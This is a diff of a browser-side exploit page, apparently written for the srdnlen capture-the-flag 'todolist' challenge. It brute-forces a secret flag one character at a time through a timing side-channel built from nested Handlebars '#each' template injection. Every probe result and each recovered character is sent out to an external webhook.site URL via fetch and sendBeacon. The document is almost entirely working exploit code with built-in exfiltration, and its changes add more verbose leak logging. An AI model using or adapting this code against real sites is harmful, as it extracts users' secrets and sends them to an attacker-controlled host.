@@ -4,20 +4,27 @@
 <script>
 const TARGET       = "https://todolist.challs.srdnlen.it";
 const WEBHOOK      = "https://webhook.site/6f885820-07e1-42ec-965b-8042f45342f8";
-const START_PREFIX = "srdnlen{";   // ← update this each visit with what you have so far
+const START_PREFIX = "srdnlen{";
 const CHARSET      = "abcdefghijklmnopqrstuvwxyz_0123456789}";
 const ARRLEN       = 11;
 const DEPTH        = 7;
-const MATCH_MS     = 1500;  // no-match ~300ms, match ~4400ms
+const MATCH_MS     = 1500;
 const BUDGET       = 54000;
 
 const ARR  = JSON.stringify(Array.from({length:ARRLEN},(_,i)=>i));
 const OPEN = "{{#each @root.arr}}".repeat(DEPTH);
 const CLOS = "{{/each}}".repeat(DEPTH);
 
+// Use fetch+keepalive — more reliable than sendBeacon in headless chrome
 function ping(msg) {
   document.getElementById("log").textContent += msg + "\n";
-  navigator.sendBeacon(`${WEBHOOK}?log=${encodeURIComponent(msg)}`);
+  try {
+    fetch(`${WEBHOOK}?log=${encodeURIComponent(msg)}`, {
+      method: "POST", keepalive: true
+    }).catch(()=>{});
+  } catch(e) {}
+  // sendBeacon as backup
+  try { navigator.sendBeacon(`${WEBHOOK}?b=${encodeURIComponent(msg)}`); } catch(e) {}
 }
 
 function makeUrl(pos, ch) {
@@ -46,40 +53,48 @@ function probe(pos, ch) {
   });
 }
 
+const sleep = ms => new Promise(r => setTimeout(r, ms));
+
 async function run() {
   const t0 = Date.now();
   let flag = START_PREFIX;
-  ping(`[start] prefix=${flag}`);
+
+  ping(`START prefix=${flag}`);
+  await sleep(200); // give first ping time to send
 
   for (let pos = START_PREFIX.length; pos < 60; pos++) {
     if (Date.now()-t0 > BUDGET) {
-      ping(`[budget] stopped at pos=${pos} — resubmit with START_PREFIX="${flag}"`);
-      navigator.sendBeacon(`${WEBHOOK}?PARTIAL&flag=${encodeURIComponent(flag)}`);
+      ping(`PARTIAL flag=${flag} — update START_PREFIX and resubmit`);
       break;
     }
+
+    ping(`POS ${pos} elapsed=${Date.now()-t0}ms`);
+    await sleep(100);
 
     let found = null;
     for (const ch of CHARSET) {
       if (Date.now()-t0 > BUDGET) break;
+
+      // ping before probe so we know exactly where it hangs
+      ping(`TRY pos=${pos} ch=${ch}`);
       const r = await probe(pos, ch);
+      ping(`RES pos=${pos} ch=${ch} dt=${r.dt}ms slow=${r.slow}`);
+
       if (r.slow) { found = ch; break; }
     }
 
     if (found) {
       flag += found;
-      ping(`[FLAG] ${flag}`);
-      navigator.sendBeacon(`${WEBHOOK}?FLAG=${encodeURIComponent(flag)}`);
+      ping(`HIT pos=${pos} ch=${found} FLAG=${flag}`);
+      await sleep(100);
       if (found === "}") break;
     } else {
-      ping(`[MISS] pos=${pos} — update CHARSET or resubmit`);
-      navigator.sendBeacon(`${WEBHOOK}?MISS&pos=${pos}&flag=${encodeURIComponent(flag)}`);
+      ping(`MISS pos=${pos} FLAG=${flag}`);
       break;
     }
   }
 
-  const total = Date.now()-t0;
-  ping(`[DONE] ${flag}  (${total}ms)`);
-  navigator.sendBeacon(`${WEBHOOK}?DONE&flag=${encodeURIComponent(flag)}&ms=${total}`);
+  ping(`DONE FLAG=${flag} ms=${Date.now()-t0}`);
 }
 
 run();
